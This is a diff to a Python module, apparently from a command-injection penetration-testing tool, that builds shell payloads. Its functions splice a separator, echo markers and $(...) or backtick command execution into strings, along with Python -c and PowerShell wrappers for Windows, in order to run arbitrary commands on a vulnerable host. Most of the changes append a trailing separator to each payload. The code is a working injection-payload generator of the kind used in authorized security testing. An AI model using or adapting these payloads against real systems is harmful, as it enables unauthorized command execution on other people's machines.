@@ -51,12 +51,14 @@ def decision(separator, TAG, randv1, randv2):
       if settings.USE_BACKTICKS:
         payload = (separator +
                   "echo " + TAG +
-                  TAG + "" + TAG + ""
+                  TAG + "" + TAG + "" + 
+                  separator
                    )
       else:
         payload = (separator +
                   "echo " + TAG +
-                  "$(echo " + TAG + ")" + TAG + ""
+                  "$(echo " + TAG + ")" + TAG + "" + 
+                  separator
                    )
     else:
       if settings.USE_BACKTICKS:
@@ -69,7 +71,8 @@ def decision(separator, TAG, randv1, randv2):
         payload = (separator +
                   "echo " + TAG +
                   math_calc +
-                  "$(echo " + TAG + ")" + TAG + ""
+                  "$(echo " + TAG + ")" + TAG + "" + 
+                  separator
                    )
   return payload
 
@@ -93,14 +96,16 @@ def decision_alter_shell(separator, TAG, randv1, randv2):
       payload = (separator +
                 settings.LINUX_PYTHON_INTERPRETER + " -c \"print('" + TAG +
                 TAG +
-                TAG + "')\""
+                TAG + "')\"" + 
+                separator
                 )
     else:
       payload = (separator +
                 settings.LINUX_PYTHON_INTERPRETER + " -c \"print('" + TAG +
                 "'%2Bstr(int(" + str(int(randv1)) + "%2B" + str(int(randv2)) + "))" + "%2B'" +
                 TAG + "'%2B'" +
-                TAG + "')\""
+                TAG + "')\"" + 
+                separator
                 )
   return payload
 
@@ -110,7 +115,8 @@ Execute shell commands on vulnerable host.
 def cmd_execution(separator, TAG, cmd):
   if settings.TARGET_OS == settings.OS.WINDOWS:
     if settings.REVERSE_TCP:
-      payload = (separator + cmd + settings.SINGLE_WHITESPACE
+      payload = (separator + 
+                cmd + settings.SINGLE_WHITESPACE
                 )
     else:
       payload = (separator +
@@ -119,14 +125,15 @@ def cmd_execution(separator, TAG, cmd):
                 "\"') do @set /p = " + TAG + TAG + "%i" + TAG + TAG + settings.CMD_NUL
                 )
   else:
-    settings.USER_SUPPLIED_CMD = cmd
+    settings.USER_APPLIED_CMD = cmd
     if settings.USE_BACKTICKS:
       cmd_exec = "`" + cmd + "`"
       payload = (separator +
                 "echo " + TAG +
                 "" + TAG + "" +
                 cmd_exec +
-                "" + TAG + "" + TAG + ""
+                "" + TAG + "" + TAG + "" + 
+                separator
                 )
     else:
       cmd_exec = "$(" + cmd + ")"
@@ -134,7 +141,8 @@ def cmd_execution(separator, TAG, cmd):
                 "echo " + TAG +
                 "$(echo " + TAG + ")" +
                 cmd_exec +
-                "$(echo " + TAG + ")" + TAG + ""
+                "$(echo " + TAG + ")" + TAG + "" + 
+                separator
                 )
 
   return payload
@@ -145,12 +153,15 @@ __Warning__: The alternative shells are still experimental.
 def cmd_execution_alter_shell(separator, TAG, cmd):
   if settings.TARGET_OS == settings.OS.WINDOWS:
     if settings.REVERSE_TCP:
-      payload = (separator + cmd + settings.SINGLE_WHITESPACE
+      payload = (separator + 
+                cmd + settings.SINGLE_WHITESPACE
                 )
     else:
       payload = (separator +
                 "for /f \"tokens=*\" %i in ('" +
-                settings.WIN_PYTHON_INTERPRETER + " -c \"import os; os.system('powershell.exe -InputFormat none write-host " + TAG + TAG + " $(" + cmd + ") "+ TAG + TAG + "')\"" +
+                settings.WIN_PYTHON_INTERPRETER + 
+                " -c \"import os; os.system('powershell.exe -InputFormat none write-host " + 
+                TAG + TAG + " $(" + cmd + ") "+ TAG + TAG + "')\"" +
                 "') do @set /p=%i " + settings.CMD_NUL
                 )
 
@@ -158,11 +169,17 @@ def cmd_execution_alter_shell(separator, TAG, cmd):
 
     if settings.USE_BACKTICKS:
       payload = (separator +
-                settings.LINUX_PYTHON_INTERPRETER + " -c \"print('" + TAG + "'%2B'" + TAG + "'%2B'$(echo `" + cmd + ")`" + TAG + "'%2B'" + TAG + "')\""
+                settings.LINUX_PYTHON_INTERPRETER + 
+                " -c \"print('" + TAG + "'%2B'" + TAG + "'%2B'$(echo `" + cmd + ")`" + 
+                TAG + "'%2B'" + TAG + "')\"" + 
+                separator
                 )
     else:
       payload = (separator +
-                settings.LINUX_PYTHON_INTERPRETER + " -c \"print('" + TAG + "'%2B'" + TAG + "'%2B'$(echo $(" + cmd + "))'%2B'" + TAG + "'%2B'" + TAG + "')\""
+                settings.LINUX_PYTHON_INTERPRETER + 
+                " -c \"print('" + TAG + "'%2B'" + TAG + "'%2B'$(echo $(" + cmd + "))'%2B'" + 
+                TAG + "'%2B'" + TAG + "')\"" + 
+                separator
                 )
   return payload
 
